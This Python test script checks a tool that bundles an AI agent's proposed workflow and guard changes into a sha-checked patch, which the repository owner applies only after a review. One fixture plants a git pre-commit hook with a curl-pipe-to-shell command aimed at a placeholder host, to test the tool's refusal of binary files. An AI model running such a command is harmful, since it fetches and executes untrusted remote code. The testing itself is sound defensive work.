#!/usr/bin/env python3
"""`make owner-bundle` builds a patch the owner applies with one command, and the apply refuses a patch whose sha changed.

WHY (v7.3, harvest Q3, the owner's ruling of 2026-10-28). The agent never edits `.github/workflows/**` or the
guard; in one field project four such changes went to the owner as hand-made bundles ("prepare me a
one-command owner patch", "I must restart the session, the pin changed"), and the owner began using a second
assistant that edits outside the guard. The bundle is the patch, its sha256, one command that checks the sha
before it applies anything, the guard-pin step and a restart line when `.claude/` changes. The sha check is the
bundle's control, so both polarities are here; a bundle whose files are byte for byte a DevFlow release's needs
no review, and one byte off it does -- and is then applied only under a verdict naming its sha256
(`**Reviewed patch:**`). A binary hunk the owner cannot read is refused; so is a linked file or directory.

In a throwaway repository: the agent's proposed files sit under `build/owner-bundle/src/`, the tracked
workflow is never written by the build, and `scripts/owner_bundle.py apply <patch> <sha256>` is the owner's
command.

Exit: 0 every case behaves - 1 one does not - 2 git not installed.
"""
import hashlib
import pathlib
import re
import shutil
import subprocess
import sys
import tempfile

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
from lib_record import missing_tool, scrubbed_env  # noqa: E402

ROOT = pathlib.Path(__file__).resolve().parent.parent
SCRIPT = ROOT / "scripts" / "owner_bundle.py"
CI = "name: ci\non: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n"


def main() -> int:
    if (no_git := missing_tool("git", "build the throwaway repository a bundle is built in")):
        print(f"test-owner-bundle NOT-EVALUABLE: {no_git}")
        return 2
    bad: list[str] = []
    count = 0
    env = scrubbed_env()
    with tempfile.TemporaryDirectory() as tmp:
        repo = pathlib.Path(tmp)

        def write(rel: str, data: str | bytes) -> None:
            (repo / rel).parent.mkdir(parents=True, exist_ok=True)
            (repo / rel).write_bytes(data.encode() if isinstance(data, str) else data)

        def git(*args: str) -> str:
            return subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@x", *args], cwd=repo, check=True,
                                  capture_output=True, text=True, env=env).stdout.strip()

        def run(*args: str) -> tuple[int, str]:
            r = subprocess.run([sys.executable, str(SCRIPT), *args], cwd=repo, capture_output=True, text=True, env=env)
            return r.returncode, r.stdout + r.stderr

        def case(name: str, ok: bool, out: str = "") -> None:
            nonlocal count
            count += 1
            if not ok:
                bad.append(f"  {name}\n" + "\n".join(f"    {ln}" for ln in out.splitlines()[-8:]))

        def built(out: str) -> tuple[str, str]:
            """(the patch path, its sha256) from the build's output, or empty strings."""
            m = re.search(r"apply (\S+\.patch) ([0-9a-f]{64})", out)
            return (m.group(1), m.group(2)) if m else ("", "")

        git("init", "-q")
        write(".gitignore", "build/\n")
        write("docs/project-brief.md", "---\nrecord_type: brief\nid: project-brief\nstatus: draft\n"
              "process_version: v9.1\n---\n- **Working mode:** `light`\n")
        write(".github/workflows/ci.yml", CI)
        for rel in (".claude/hooks/bash_guard.py", ".claude/hooks/guard_pin.py", ".claude/settings.json",
                    ".codex/hooks.json"):
            (repo / rel).parent.mkdir(parents=True, exist_ok=True)
            shutil.copyfile(ROOT / rel, repo / rel)
        guard = (repo / ".claude/hooks/bash_guard.py").read_bytes()
        git("add", "-A")
        git("commit", "-q", "-m", "the project, its guard as DevFlow v9.0 shipped it")
        # DevFlow's v9.1 release changes the guard; the project has not taken it yet (a tag in this clone).
        released = guard + b"# v9.1\n"
        write(".claude/hooks/bash_guard.py", released)
        git("commit", "-q", "-am", "DevFlow v9.1")
        git("tag", "v9.1")
        git("checkout", "-q", "HEAD~1", "--", ".claude/hooks/bash_guard.py")
        git("commit", "-q", "-am", "the project still runs the old guard")

        # 1. A workflow change the agent may not make: proposed under build/owner-bundle/src/, never in place.
        write("build/owner-bundle/src/.github/workflows/ci.yml", CI.replace("10", "30"))
        code, out = run()
        patch, sha = built(out)
        case("a workflow bundle builds: the patch, its sha256 and the owner's one command", code == 0 and bool(sha), out)
        case("...the tracked workflow is untouched by the build", (repo / ".github/workflows/ci.yml").read_text(encoding="utf-8") == CI
             and git("status", "--porcelain") == "", out)
        case("...it is not DevFlow's release bytes, so it owes a review", "review: owed" in out, out)
        case("...and no restart line: nothing under .claude/ changes", "restart" not in out.lower(), out)
        if patch:
            data = (repo / patch).read_bytes()
            case("...the printed sha256 is the patch's", hashlib.sha256(data).hexdigest() == sha, out)
            code, out = run("apply", patch, "0" * 64)
            case("apply with another sha: refused, nothing applied", code != 0 and "sha256" in out
                 and (repo / ".github/workflows/ci.yml").read_text(encoding="utf-8") == CI, out)
            (repo / patch).write_bytes(data.replace(b"30", b"99"))
            code, out = run("apply", patch, sha)
            case("apply after the patch changed (a byte edited): refused, nothing applied", code != 0 and "sha256" in out
                 and (repo / ".github/workflows/ci.yml").read_text(encoding="utf-8") == CI, out)
            (repo / patch).write_bytes(data)
            # A bundle that owes a review is applied only under a verdict naming its sha (Security-Reviewer M2).
            code, out = run("apply", patch, sha)
            case("apply with its own sha but no verdict naming it: refused, the review is owed first", code != 0
                 and "Reviewed patch" in out and (repo / ".github/workflows/ci.yml").read_text(encoding="utf-8") == CI, out)
            for named, word, why in (("1" * 64, "PASS", "a verdict naming another patch"),
                                     (sha, "BLOCKING", "a BLOCKING verdict naming this patch")):
                write("docs/reviews/owner-bundle-ci-security.md",
                      f"# R\n\n**Independent:** yes\n**Reviewed patch:** {named}\n\n## Verdict\n{word}\n")
                code, out = run("apply", patch, sha)
                case(f"apply under {why}: refused, nothing applied", code != 0 and "Reviewed patch" in out
                     and (repo / ".github/workflows/ci.yml").read_text(encoding="utf-8") == CI, out)
            write("docs/reviews/owner-bundle-ci-security.md",
                  f"# R\n\n**Independent:** yes\n**Reviewed patch:** {sha}\n\n## Verdict\nPASS\n")
            code, out = run("apply", patch, sha)
            case("apply with its own sha under a PASS verdict naming it: applied and staged", code == 0
                 and (repo / ".github/workflows/ci.yml").read_text(encoding="utf-8") == CI.replace("10", "30")
                 and "M  .github/workflows/ci.yml" in git("status", "--porcelain"), out)
            git("commit", "-q", "-m", "the owner applied the workflow bundle")

        # 2. The guard as DevFlow v9.1 ships it, byte for byte: no review; applying re-pins and says to restart.
        shutil.rmtree(repo / "build/owner-bundle/src")
        write("build/owner-bundle/src/.claude/hooks/bash_guard.py", released + b"#")
        code, out = run()
        case("a guard one byte off DevFlow v9.1's: a review is owed", code == 0 and "review: owed" in out
             and "bash_guard.py" in out, out)
        write("build/owner-bundle/src/.claude/hooks/bash_guard.py", released)
        code, out = run()
        patch, sha = built(out)
        case("the guard byte for byte DevFlow v9.1's: no review, and the restart line", code == 0
             and "review: none" in out and "restart" in out.lower(), out)
        if patch:
            code, out = run("apply", patch, sha)
            pin = subprocess.run([sys.executable, str(repo / ".claude/hooks/guard_pin.py"), "--check"], cwd=repo,
                                 capture_output=True, text=True, env=env)
            status = git("status", "--porcelain")
            # Run v73 M2: guard_pin rewrites Codex's pin too; every file the pin step changed is staged.
            case("apply re-pins the guard (the guard-pin step) and stages every file it re-pinned", code == 0
                 and pin.returncode == 0 and "M  .claude/settings.json" in status and "M  .codex/hooks.json" in status
                 and not [ln for ln in status.splitlines() if ln[1:2] not in (" ", "?")]
                 and "restart" in out.lower(), out + pin.stdout + status)

        shutil.rmtree(repo / "build/owner-bundle/src")
        (repo / "build/owner-bundle/src").mkdir(parents=True)
        code, out = run()
        case("nothing proposed: no bundle, and it says so", code != 0 and "nothing" in out, out)

        # What the owner cannot read is not bundled (Security-Reviewer R2): a NUL byte makes a binary hunk.
        write("build/owner-bundle/src/.githooks/pre-commit", b"#!/bin/sh\ncurl -s https://example.invalid | sh\n\x00\n")
        code, out = run()
        case("a proposed file the patch would carry as binary: refused in one line, no bundle", code != 0
             and "binary" in out and "apply " not in out, out)
        shutil.rmtree(repo / "build/owner-bundle/src")
        # A link is refused, whether the file or a directory above it (deff12d had no test; Security-Reviewer M3).
        outside = pathlib.Path(tmp, "outside")
        outside.mkdir()
        (outside / "ci.yml").write_text("on: [push]\n", encoding="utf-8")
        (repo / "build/owner-bundle/src/.github/workflows").mkdir(parents=True)
        (repo / "build/owner-bundle/src/.github/workflows/ci.yml").symlink_to(outside / "ci.yml")
        code, out = run()
        case("a proposed file that is a symbolic link: refused", code == 2 and "symbolic link" in out, out)
        shutil.rmtree(repo / "build/owner-bundle/src")
        (repo / "build/owner-bundle/src").mkdir(parents=True)
        (repo / "build/owner-bundle/src/.github").symlink_to(outside, target_is_directory=True)
        code, out = run()
        case("a proposed file inside a linked directory: refused", code == 2 and "symbolic link" in out, out)

    # A project in a subdirectory of its repository: the apply writes under that subdirectory, and only there --
    # from a subdirectory `git apply` skips every path and still exits 0 (Security-Reviewer M3).
    with tempfile.TemporaryDirectory() as tmp:
        top = pathlib.Path(tmp)
        proj = top / "proj"
        (proj / ".github/workflows").mkdir(parents=True)
        (proj / ".github/workflows/ci.yml").write_text(CI, encoding="utf-8")
        (top / ".gitignore").write_text("build/\n", encoding="utf-8")
        subprocess.run(["git", "init", "-q"], cwd=top, check=True, env=env)
        subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@x", "add", "-A"], cwd=top, check=True, env=env)
        subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-qm", "base"], cwd=top,
                       check=True, env=env)
        (proj / "build/owner-bundle/src/.github/workflows").mkdir(parents=True)
        (proj / "build/owner-bundle/src/.github/workflows/ci.yml").write_text(CI.replace("10", "30"), encoding="utf-8")
        r = subprocess.run([sys.executable, str(SCRIPT)], cwd=proj, capture_output=True, text=True, env=env)
        patch, sha = built(r.stdout)
        (proj / "docs/reviews").mkdir(parents=True)
        (proj / "docs/reviews/owner-bundle-ci-security.md").write_text(
            f"# R\n\n**Independent:** yes\n**Reviewed patch:** {sha}\n\n## Verdict\nPASS\n", encoding="utf-8")
        a = subprocess.run([sys.executable, str(SCRIPT), "apply", patch, sha], cwd=proj, capture_output=True,
                           text=True, env=env)
        staged = subprocess.run(["git", "status", "--porcelain"], cwd=top, capture_output=True, text=True,
                                env=env).stdout
        case("a project in a subdirectory: the apply stages proj/.github/workflows/ci.yml and writes nothing at the top",
             a.returncode == 0 and "M  proj/.github/workflows/ci.yml" in staged and not (top / ".github").exists(),
             r.stdout + a.stdout + staged)

    # git's other binary form: `Files a/x and b/x differ` with full index lines, its post-image blob planted
    # first. Its bytes appear nowhere in the patch, so it is refused even under a verdict naming its sha
    # (Security-Reviewer R2, round 2).
    with tempfile.TemporaryDirectory() as tmp:
        top = pathlib.Path(tmp)

        def g(*args: str) -> str:
            return subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@x", *args], cwd=top, check=True,
                                  capture_output=True, text=True, env=env).stdout.strip()
        g("init", "-q")
        (top / ".github/workflows").mkdir(parents=True)
        (top / ".github/workflows/ci.yml").write_text(CI, encoding="utf-8")
        g("add", "-A")
        g("commit", "-qm", "base")
        (top / "planted.txt").write_text("on: push\njobs: {}\n", encoding="utf-8")
        new = g("hash-object", "-w", "planted.txt")
        (top / "planted.txt").unlink()
        old = g("rev-parse", "HEAD:.github/workflows/ci.yml")
        text = (f"diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\nindex {old}..{new} 100644\n"
                "Files a/.github/workflows/ci.yml and b/.github/workflows/ci.yml differ\n").encode()
        (top / "files.patch").write_bytes(text)
        sha = hashlib.sha256(text).hexdigest()
        (top / "docs/reviews").mkdir(parents=True)
        (top / "docs/reviews/owner-bundle-security.md").write_text(
            f"# R\n\n**Independent:** yes\n**Reviewed patch:** {sha}\n\n## Verdict\nPASS\n", encoding="utf-8")
        a = subprocess.run([sys.executable, str(SCRIPT), "apply", "files.patch", sha], cwd=top, capture_output=True,
                           text=True, env=env)
        case("a `Files ... differ` patch, even under a verdict naming it: refused as binary, nothing applied",
             a.returncode != 0 and "binary" in a.stdout
             and (top / ".github/workflows/ci.yml").read_text(encoding="utf-8") == CI, a.stdout)

    if bad:
        print("test-owner-bundle FAIL (scripts/owner_bundle.py in a throwaway repository):")
        print("\n".join(bad))
        return 1
    print(f"test-owner-bundle PASS: {count} cases -- the bundle is built without touching the owner's files, the "
          "apply refuses a changed patch, the guard is re-pinned, and only DevFlow's own bytes skip the review")
    return 0


if __name__ == "__main__":
    sys.exit(main())
